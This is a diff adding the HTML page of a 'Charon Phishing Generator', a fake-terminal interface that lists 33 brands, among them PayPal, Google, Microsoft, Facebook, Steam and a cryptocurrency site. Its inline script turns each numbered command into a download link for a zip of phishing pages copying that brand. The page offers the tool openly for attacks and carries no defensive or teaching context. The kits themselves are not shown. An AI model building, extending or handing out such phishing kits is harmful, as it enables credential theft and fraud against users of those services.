@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Charon Phishing Generator</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="shortcut icon" href="assets/img/fav.png" type="image/x-icon">
+    <style id="ptty-boring-theme">.boring, .boring .prompt, .boring .content{ font-family: "Courier New", Courier, monospace; background-color: #000000; color: #ddd; }
+        .boring .content{ padding: 15px 15px 0 15px; }
+        .boring .prompt{ padding: 0 15px 15px 15px; }
+        .boring .loading span::after{content: "⚙"; color: #ddd; font-size: 10em; border-radius: 10em; opacity: 0.4;}
+        .boring .content ul{ margin: 0; }
+        .boring .prompt .input.show-caret{ color: #ddd; opacity: .85; }
+        .boring .prompt .input, .boring .prompt .input::before, .boring .prompt .input::after{ color: transparent; text-shadow:0 0 0 #ddd; }
+        .boring .content div .cmd_in .cmd_ps, .boring .prompt .input::before{ padding-right: 10px; }
+        .boring .content ul li{ list-style-type: none; }
+        .boring div.prompt div.input::after{ font-size: 2em; }
+        .boring div.prompt div.input, .boring div.content div div.cmd_in, .boring div.prompt div.input::before{ line-height: 2em; }
+    </style>
+    <style id="ptty-styles">
+        #terminal{ position: relative; display: block; overflow-X: hidden; height: 100%; }
+        #terminal div.content div p{ margin: 0; }
+        #terminal div.content div{ clear: both; white-space:pre-wrap; word-wrap:break-word; }
+        #terminal div.content div ul{ padding: 0; white-space: normal }
+        #terminal div.content div ul li{ list-style: none; }
+        #terminal div.content div ul.sq-li li{ display: inline-block; text-align: center; padding: 10px; min-width: 5%; }
+        #terminal div.prompt div.input{ width: 100%; white-space:pre-wrap; word-wrap:break-word; cursor: default; outline: none;}
+        #terminal div.prompt div.input::before{ vertical-align: middle; content: attr(data-ps); }
+        #terminal div.prompt div.input::after{ visibility : visible; vertical-align: middle; content: attr(data-caret); margin-left:-0.15em;}
+        #terminal div.prompt div.input.blink::after{ visibility : hidden; }
+        #terminal div.prompt .hide{ position:absolute; top: -9999em; }
+        #terminal div.loading{ display: none; }
+        #terminal div.loading.working{ display: block; display:flex; justify-content: center; align-items: center;position: fixed;  width: inherit; height: inherit; }
+        #terminal div.loading span{ -webkit-animation: spin 4s linear infinite; -moz-animation: spin 4s linear infinite; -ms-animation: spin 4s linear infinite; -o-animation: spin 4s linear infinite; animation: spin 4s linear infinite; }@-moz-keyframes spin { 100% { -moz-transform: rotate(360deg); } }@-webkit-keyframes spin { 100% { -webkit-transform: rotate(360deg); } }@-ms-keyframes spin { 100% { -ms-transform: rotate(360deg); } }@-o-keyframes spin { 100% { -o-transform: rotate(360deg); } }@keyframes spin { 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <audio id="apGenAudio" src="assets/audio/link.wav" __idm_id__="1392641"></audio>
+    <audio id="beep" src="assets/audio/beep.ogg"></audio>
+    <div id="terminal" data-theme="boring" class="boring">
+        <div class="loading">
+            <span></span>
+        </div>
+        <div class="content">
+            <div>
+
++----------------------------------------------------+
+|----------------------------------------------------|
+|-|░░░░░░░░   Charon Phishing Generator    ░░░░░░░░|-|
+|-|           ________________________             |-|
+|-|                                                |-|
+|-|  Programming By AmirHossein Ghanami [C#4120n]  |-|
+|-|              Ch4120ni@Gmail.com                |-|
+|-|                                                |-|
+|----------------------------------------------------|
+|      Help : clear Command For Clears the screen    |
++----------------------------------------------------+
+
+
+Select Your Social Network To Build Phishing :
+[1] = adobe
+[2] = badoo
+[3] = cryptocurrency
+[4] = devianart
+[5] = dropbox
+[6] = facebook
+[7] = github
+[8] = gitlab
+[9] = google
+[10] = instafollowers
+[11] = instagram
+[12] = linkedin
+[13] = messenger
+[14] = microsoft
+[15] = myspace
+[16] = netflix
+[17] = origin
+[18] = paypal
+[19] = pinterest
+[21] = shopify
+[22] = shopping
+[23] = snapchat
+[24] = spotify
+[25] = steam
+[26] = twitch
+[27] = twitter
+[28] = verizon
+[29] = vk
+[30] = wordpress
+[31] = yahoo
+[32] = yandex
+[33] = pornhub
+            </div>
+        <div class="prompt">
+            <div class="input blink" contenteditable="" spellcheck="false" data-caret="▮" data-ps="C:\Users\BlackEagle\Desktop> "></div>
+        </div>
+        </div>
+    </div>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/ptty.jquery.js"></script>
+    <script>
+        $(document).ready(function(){var beepBG=document.getElementById('beep');beepBG.volume=0.2;document.getElementById('beep').play();var $ptty=$('#terminal').Ptty();$ptty.register('command',{name:'1',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/adobe.zip">Click Here To Download adobe Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'adobe Phishing Generator'});$ptty.register('command',{name:'2',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/badoo.zip">Click Here To Download badoo Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'badoo Phishing Generator'});$ptty.register('command',{name:'3',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/cryptocurrency.zip">Click Here To Download cryptocurrency Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'cryptocurrency Phishing Generator'});$ptty.register('command',{name:'4',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/devianart.zip">Click Here To Download devianart Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'devianart Phishing Generator'});$ptty.register('command',{name:'5',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/dropbox.zip">Click Here To Download dropbox Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'dropbox Phishing Generator'});$ptty.register('command',{name:'6',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/facebook.zip">Click Here To Download facebook Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'facebook Phishing Generator'});$ptty.register('command',{name:'7',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/github.zip">Click Here To Download github Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'github Phishing Generator'});$ptty.register('command',{name:'8',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/gitlab.zip">Click Here To Download gitlab Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'gitlab Phishing Generator'});$ptty.register('command',{name:'9',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/google.zip">Click Here To Download google Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'google Phishing Generator'});$ptty.register('command',{name:'10',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/instafollowers.zip">Click Here To Download instafollowers Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'instafollowers Phishing Generator'});$ptty.register('command',{name:'11',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/instagram.zip">Click Here To Download instagram Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'instagram Phishing Generator'});$ptty.register('command',{name:'12',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/linkedin.zip">Click Here To Download linkedin Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'linkedin Phishing Generator'});$ptty.register('command',{name:'13',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/messenger.zip">Click Here To Download messenger Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'messenger Phishing Generator'});$ptty.register('command',{name:'14',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/microsoft.zip">Click Here To Download microsoft Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'microsoft Phishing Generator'});$ptty.register('command',{name:'15',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/myspace.zip">Click Here To Download myspace Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'myspace Phishing Generator'});$ptty.register('command',{name:'16',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/netflix.zip">Click Here To Download netflix Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'netflix Phishing Generator'});$ptty.register('command',{name:'17',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/origin.zip">Click Here To Download origin Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'origin Phishing Generator'});$ptty.register('command',{name:'18',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/paypal.zip">Click Here To Download paypal Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'paypal Phishing Generator'});$ptty.register('command',{name:'19',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/pinterest.zip">Click Here To Download pinterest Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'pinterest Phishing Generator'});$ptty.register('command',{name:'20',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/protonmail.zip">Click Here To Download protonmail Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'protonmail Phishing Generator'});$ptty.register('command',{name:'21',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/shopify.zip">Click Here To Download shopify Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'shopify Phishing Generator'});$ptty.register('command',{name:'22',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/shopping.zip">Click Here To Download shopping Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'shopping Phishing Generator'});$ptty.register('command',{name:'23',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/snapchat.zip">Click Here To Download snapchat Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'snapchat Phishing Generator'});$ptty.register('command',{name:'24',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/spotify.zip">Click Here To Download spotify Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'spotify Phishing Generator'});$ptty.register('command',{name:'25',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/steam.zip">Click Here To Download steam Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'steam Phishing Generator'});$ptty.register('command',{name:'26',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/twitch.zip">Click Here To Download twitch Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'twitch Phishing Generator'});$ptty.register('command',{name:'27',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/twitter.zip">Click Here To Download twitter Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'twitter Phishing Generator'});$ptty.register('command',{name:'28',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/verizon.zip">Click Here To Download verizon Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'verizon Phishing Generator'});$ptty.register('command',{name:'29',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/vk.zip">Click Here To Download vk Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'vk Phishing Generator'});$ptty.register('command',{name:'30',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/wordpress.zip">Click Here To Download wordpress Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'wordpress Phishing Generator'});$ptty.register('command',{name:'31',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/yahoo.zip">Click Here To Download yahoo Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'yahoo Phishing Generator'});$ptty.register('command',{name:'32',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/yandex.zip">Click Here To Download yandex Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'yandex Phishing Generator'});$ptty.register('command',{name:'33',method:function(cmd){cmd.out='<strong><a target="_blank" download="" href="assets/pages/pornhub.zip">Click Here To Download pornhub Phishing </a></strong>';document.getElementById('apGenAudio').play();return cmd;},help:'pornhub Phishing Generator'});});
+    </script>
+</body>
+</html>
